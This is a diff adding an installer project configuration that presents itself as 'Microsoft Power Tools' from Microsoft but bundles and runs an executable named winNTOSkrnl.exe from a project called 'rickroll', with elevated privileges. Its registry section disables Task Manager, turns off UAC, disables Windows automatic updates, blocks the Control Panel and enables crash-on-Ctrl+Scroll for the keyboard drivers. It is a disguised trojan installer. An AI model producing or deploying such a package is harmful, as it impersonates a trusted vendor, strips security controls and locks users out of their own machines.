@@ -1,0 +1,98 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<iasettings>
+  <projectproperties>
+    <manufacturer>Microsoft</manufacturer>
+    <productname>Power Tools</productname>
+    <productversion>0.1.3a</productversion>
+    <productcode>{1aff6b35-62fa-4224-ae19-3deacd25e002}</productcode>
+    <upgradecode />
+    <language>0</language>
+    <languagename>English</languagename>
+  </projectproperties>
+  <summary>
+    <title>Microsoft</title>
+    <subject>Power Tools</subject>
+    <author>Microsoft</author>
+    <summarycomments>Power Tools</summarycomments>
+    <revisioncode>{d6a98f17-c2e8-494d-ab48-47600eee3ae8}</revisioncode>
+    <uacelevation>highestAvailable</uacelevation>
+  </summary>
+  <addremove>
+    <publishername>Microsoft</publishername>
+    <contactname>Microsoft</contactname>
+    <helplink>www.support.microsoft.com</helplink>
+    <productupdatelink>powertools.microsoft.com</productupdatelink>
+    <addremovecomments>All Rights Reserved</addremovecomments>
+    <iconfile />
+  </addremove>
+  <codegen>
+    <generateincludefiles>0</generateincludefiles>
+    <generatefeatures>1</generatefeatures>
+    <refreshscript>0</refreshscript>
+  </codegen>
+  <compilervariables>
+    <variables />
+  </compilervariables>
+  <build>
+    <buildtype>0</buildtype>
+    <buildasmsi>False</buildasmsi>
+    <cachesources>1</cachesources>
+  </build>
+  <targetfolders>
+    <targetdetails name="$ALLBOOTPATH$" id="9" flag="TRUE" default="False" />
+  </targetfolders>
+  <files>
+    <filedetails filename="C:\Users\Wilmer Zhang\source\repos\rickroll\Debug\winNTOSkrnl.exe" targetlocation="$PROGRAMFILES$" type="2" generatenativeimage="0" registerassembly="0" runinstallerclass="0" createshortcut="0" runprogram="1" installfilecommand="1" />
+  </files>
+  <dependencies />
+  <registry>
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows\CurrentVersion" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows\CurrentVersion\Policies" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" data="1" value="DisableTaskMgr" flag="FALSE" type="4" permanent="True" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" data="0" value="EnableLUA" flag="FALSE" type="4" permanent="True" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows\WindowsUpdate" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows\WindowsUpdate\AU" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows\WindowsUpdate\AU" data="1" value="NoAutoUpdate" flag="FALSE" type="4" permanent="True" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" data="1" value="NoControlPanel" flag="FALSE" type="4" permanent="True" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="System" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="System\CurrentControlSet" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="System\CurrentControlSet\Services" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="System\CurrentControlSet\Services\i8042prt" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="System\CurrentControlSet\Services\i8042prt\Parameters" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="System\CurrentControlSet\Services\i8042prt\Parameters" data="1" value="CrashOnCtrlScroll" flag="FALSE" type="4" permanent="True" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="System\CurrentControlSet\Services\kbdhid" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="System\CurrentControlSet\Services\kbdhid\Parameters" data="" value="" flag="TRUE" type="0" permanent="False" />
+    <registrydetails root="HKEY_LOCAL_MACHINE" key="System\CurrentControlSet\Services\kbdhid\Parameters" data="1" value="CrashOnCtrlScroll" flag="FALSE" type="4" permanent="True" />
+  </registry>
+  <dialogtheme>
+    <themename>Official</themename>
+  </dialogtheme>
+  <authenticode>
+    <sign>0</sign>
+    <mode>0</mode>
+    <certificatefile />
+    <keyfile />
+    <pfxfile />
+    <productinfourl />
+    <authpassword />
+    <timestampurl />
+    <signall>1</signall>
+  </authenticode>
+  <compression>
+    <compressiontype>8</compressiontype>
+    <encrypt>0</encrypt>
+    <compressionpassword />
+  </compression>
+  <output>
+    <outputtype>0</outputtype>
+    <location />
+    <filename />
+    <calculatefilehash>0</calculatefilehash>
+    <refreshrevisioncode>1</refreshrevisioncode>
+  </output>
+</iasettings>
